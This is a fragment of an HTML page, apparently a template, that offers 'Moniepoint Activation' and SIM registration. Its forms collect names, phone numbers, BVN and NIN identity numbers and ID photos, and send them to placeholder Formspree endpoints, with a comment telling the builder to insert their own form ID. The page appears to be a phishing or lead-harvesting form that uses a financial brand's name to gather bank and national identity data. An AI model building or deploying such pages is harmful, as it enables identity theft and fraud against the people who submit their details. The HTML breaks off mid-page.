<!DOCTYPE html>
<html lang="en">
<head>

    <section id="moniepoint">
        <h2>Moniepoint Activation</h2>
        <form action="https://formspree.io/f/YOUR_FREE_FORM_ID" method="POST"> <!-- Signup at formspree.io, replace ID -->
            <input type="text" name="name" placeholder="Full Name" required>
            <input type="tel" name="phone" placeholder="Phone" required>
            <input type="text" name="bvn" placeholder="BVN" required>
            <input type="email" name="email" placeholder="Email" required>
            <button type="submit">Activate Now (Free Lead)</button>
        </form>
    </section>

    <section id="sim">
        <h2>SIM Registration</h2>
        <form action="https://formspree.io/f/YOUR_SIM_ID" method="POST">
            <input type="text" name="name" placeholder="Name" required>
            <input type="text" name="nin" placeholder="NIN" required>
            <input type="file" name="id" accept="image/*">
            <button type="submit">Register SIM</button>
        </form>
    </section>

    <section id="cac">
        <h2>CAC Registration</h2>
        <p>Expert help for business setup. Contact for details. <!-- Add his content --></p>

    <section id="it">
